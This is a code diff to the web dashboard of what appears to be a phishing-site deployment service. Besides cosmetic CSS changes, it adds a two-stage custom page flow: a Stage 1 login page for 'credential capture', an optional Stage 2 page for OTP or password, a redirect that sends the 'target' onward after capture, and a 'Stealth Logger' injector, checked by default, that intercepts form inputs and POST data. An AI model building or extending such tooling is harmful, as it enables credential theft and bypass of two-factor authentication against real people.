@@ -87,8 +87,8 @@
         /* Template Grid */
         .template-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 1.5rem;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); /* Larger base width */
+            gap: 2rem;
             margin-top: 1rem;
         }
 
@@ -123,9 +123,18 @@
         .preview-img-container {
             position: relative;
             width: 100%;
-            aspect-ratio: 16 / 10;
+            aspect-ratio: 16 / 11; /* Slightly taller for better image fitting */
             background: #00000040;
             overflow: hidden;
+        }
+
+        .preview-img-container::after {
+            content: '';
+            position: absolute;
+            bottom: 0; left: 0; right: 0;
+            height: 30%;
+            background: linear-gradient(to top, rgba(10,14,26,1) 0%, transparent 100%);
+            pointer-events: none;
         }
         .preview-img {
             width: 100%;
@@ -156,18 +165,34 @@
             color: #b9c3e0;
         }
         .template-info {
-            padding: 1rem;
+            padding: 1.25rem 1rem;
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
             gap: 0.5rem;
-            background: rgba(10, 14, 26, 0.8);
+            background: rgba(10, 14, 26, 0.95);
+            position: relative;
+            z-index: 5;
+            border-top: 1px solid rgba(43, 110, 240, 0.1);
         }
         .template-name {
             font-weight: 700;
-            font-size: 1rem;
+            font-size: 1.05rem;
             letter-spacing: -0.2px;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .template-name::before {
+            content: '';
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--accent-primary);
+            box-shadow: 0 0 8px var(--accent-glow);
         }
         .preview-btn {
             background: rgba(43, 110, 240, 0.15);
@@ -187,12 +212,13 @@
 
         /* Toggle Switch Modern */
         .mode-toggle {
-            background: rgba(5, 10, 22, 0.7);
+            background: rgba(5, 10, 22, 0.9);
             border-radius: 2rem;
-            padding: 4px;
+            padding: 6px;
             display: flex;
-            gap: 6px;
-            border: 1px solid #252f44;
+            gap: 8px;
+            border: 1px solid rgba(43, 110, 240, 0.3);
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
         }
         .mode-option {
             flex: 1;
@@ -284,25 +310,61 @@
         </div>
 
         <!-- CUSTOM HTML SECTION (hidden by default) -->
-        <div id="section-custom" class="hidden">
-            <div class="mb-5">
-                <label class="block text-sm font-semibold mb-2 text-gray-300">📄 Upload HTML / Code</label>
-                <input type="file" onchange="loadCustomFile(this)" accept=".html,.htm,.txt" class="block w-full text-sm text-gray-400 file:mr-3 file:py-2 file:px-5 file:rounded-full file:border-0 file:text-sm file:font-medium file:bg-blue-600/20 file:text-blue-400 hover:file:bg-blue-600/40 transition">
+        <div id="section-custom" class="hidden space-y-6">
+
+            <div class="bg-black/20 p-5 rounded-2xl border border-blue-500/10">
+                <div class="flex items-center justify-between mb-4">
+                    <label class="block text-sm font-bold text-gray-200 flex items-center gap-2">
+                        <span class="text-blue-500">01.</span> Stage 1 HTML (Main Login)
+                    </label>
+                    <input type="file" onchange="loadCustomFile(this, editor)" accept=".html,.htm,.txt" class="block text-sm text-gray-400 file:mr-3 file:py-1.5 file:px-4 file:rounded-full file:border-0 file:text-xs file:font-bold file:bg-blue-600/20 file:text-blue-400 hover:file:bg-blue-600/40 transition">
+                </div>
+                <div class="rounded-xl overflow-hidden border border-gray-800 focus-within:border-blue-500 transition-colors">
+                    <textarea id="customHtml"></textarea>
+                </div>
+                <p class="text-xs text-gray-500 mt-2 font-mono">✍️ raw source code for initial credential capture.</p>
             </div>
-            <div class="mb-5">
-                <textarea id="customHtml"></textarea>
-                <p class="text-xs text-gray-500 mt-2">✍️ Write raw HTML/CSS/JS. For phishing simulations & login pages.</p>
+
+            <div class="bg-black/20 p-5 rounded-2xl border border-blue-500/10">
+                <div class="flex items-center justify-between mb-4">
+                    <label class="block text-sm font-bold text-gray-200 flex items-center gap-2">
+                        <span class="text-blue-500">02.</span> Stage 2 HTML (Optional OTP/Password)
+                    </label>
+                    <div class="flex items-center gap-3">
+                        <label class="text-xs font-mono text-gray-400">Enable 2-Stage</label>
+                        <input type="checkbox" id="enableStage2" onchange="toggleStage2()" class="w-4 h-4 rounded border-gray-600 text-blue-500 focus:ring-blue-500 accent-blue-500">
+                    </div>
+                </div>
+
+                <div id="stage2-container" class="hidden">
+                    <div class="flex items-center justify-end mb-3">
+                        <input type="file" onchange="loadCustomFile(this, editorStage2)" accept=".html,.htm,.txt" class="block text-sm text-gray-400 file:mr-3 file:py-1.5 file:px-4 file:rounded-full file:border-0 file:text-xs file:font-bold file:bg-blue-600/20 file:text-blue-400 hover:file:bg-blue-600/40 transition">
+                    </div>
+                    <div class="rounded-xl overflow-hidden border border-gray-800 focus-within:border-blue-500 transition-colors">
+                        <textarea id="customHtmlStage2"></textarea>
+                    </div>
+                    <p class="text-xs text-gray-500 mt-2 font-mono">✍️ secondary form. User is redirected here after stage 1.</p>
+                </div>
             </div>
-            <div class="mb-5">
-                <label class="block text-sm font-semibold mb-2 text-gray-300">🎯 Redirect URL (Optional)</label>
-                <input type="text" id="customRedirectUrl" placeholder="https://example.com/dashboard" class="input-modern w-full">
-                <small class="text-gray-500 block mt-1 text-xs">After data capture, redirect victim. Leave empty for default success page.</small>
-            </div>
-            <div class="mb-5 flex items-start gap-3 p-4 bg-black/30 border border-blue-500/20 rounded-xl">
-                <input type="checkbox" id="enableInjector" class="mt-1 w-5 h-5 rounded border-gray-600 text-blue-500 focus:ring-blue-500 accent-blue-500">
-                <div>
-                    <span class="font-semibold text-sm block">🕵️ Stealth Logger + Data Capture</span>
-                    <small class="text-gray-400 text-xs">Injects the advanced form interceptor. Required to capture credentials & POST data.</small>
+
+            <div class="grid md:grid-cols-2 gap-5">
+                <div class="p-5 bg-black/30 border border-blue-500/10 rounded-2xl">
+                    <label class="block text-sm font-bold mb-3 text-gray-300 flex items-center gap-2"><svg class="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg> Final Redirect URL</label>
+                    <input type="text" id="customRedirectUrl" placeholder="https://example.com/dashboard" class="input-modern w-full font-mono text-sm">
+                    <small class="text-gray-500 block mt-2 text-[11px] leading-tight">Where to send the target after final data capture. Defaults to standard success.</small>
+                </div>
+
+                <div class="p-5 bg-black/30 border border-blue-500/20 rounded-2xl relative overflow-hidden group">
+                    <div class="absolute top-0 right-0 p-2 opacity-10 group-hover:opacity-20 transition-opacity">
+                        <svg class="w-16 h-16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                    </div>
+                    <div class="relative z-10 flex items-start gap-3">
+                        <input type="checkbox" id="enableInjector" checked class="mt-1 w-5 h-5 rounded border-gray-600 text-blue-500 focus:ring-blue-500 accent-blue-500">
+                        <div>
+                            <span class="font-bold text-sm block text-blue-100">Inject Stealth Logger</span>
+                            <small class="text-gray-400 text-[11px] leading-tight block mt-1">Required to intercept inputs and POST data. Disable only if bringing your own payload.</small>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
@@ -376,6 +438,8 @@
     if (!userCode) window.location.href = 'index.html';
     else document.getElementById('uniqueCode').value = userCode;
 
+    let editorStage2 = null;
+
     // init CodeMirror
     document.addEventListener('DOMContentLoaded', () => {
         const textarea = document.getElementById('customHtml');
@@ -387,8 +451,32 @@
             matchBrackets: true,
             lineWrapping: true
         });
-        editor.setSize(null, 280);
+        editor.setSize(null, 300);
+
+        const textarea2 = document.getElementById('customHtmlStage2');
+        if (textarea2) {
+            editorStage2 = CodeMirror.fromTextArea(textarea2, {
+                mode: "htmlmixed",
+                theme: "material-ocean",
+                lineNumbers: true,
+                autoCloseTags: true,
+                matchBrackets: true,
+                lineWrapping: true
+            });
+            editorStage2.setSize(null, 250);
+        }
     });
+
+    window.toggleStage2 = function() {
+        const isChecked = document.getElementById('enableStage2').checked;
+        const container = document.getElementById('stage2-container');
+        if (isChecked) {
+            container.classList.remove('hidden');
+            setTimeout(() => editorStage2?.refresh(), 50);
+        } else {
+            container.classList.add('hidden');
+        }
+    };
 
     // ---------- Load User Info (Plan, Limits) ----------
     async function loadUserInfo() {
@@ -558,8 +646,15 @@
             payload.templateName = tmpl;
         } else {
             const htmlContent = editor.getValue();
-            if (!htmlContent.trim()) { showToast("Custom HTML cannot be empty", "error"); btn.disabled = false; btn.innerText = "⚡ Deploy Site"; return; }
+            if (!htmlContent.trim()) { showToast("Stage 1 HTML cannot be empty", "error"); btn.disabled = false; btn.innerText = "⚡ Deploy Site"; return; }
             payload.customHtml = htmlContent;
+
+            if (document.getElementById('enableStage2').checked) {
+                const stage2Content = editorStage2.getValue();
+                if (!stage2Content.trim()) { showToast("Stage 2 HTML cannot be empty", "error"); btn.disabled = false; btn.innerText = "⚡ Deploy Site"; return; }
+                payload.customHtmlStage2 = stage2Content;
+            }
+
             payload.enableInjector = document.getElementById('enableInjector').checked;
             payload.redirectUrl = document.getElementById('customRedirectUrl').value.trim();
         }
@@ -587,10 +682,13 @@
         }
     }
 
-    function loadCustomFile(input) {
+    function loadCustomFile(input, targetEditor) {
         if (!input.files[0]) return;
         const reader = new FileReader();
-        reader.onload = e => editor.setValue(e.target.result);
+        reader.onload = e => {
+            if (targetEditor) targetEditor.setValue(e.target.result);
+            else editor.setValue(e.target.result);
+        };
         reader.readAsText(input.files[0]);
     }
 
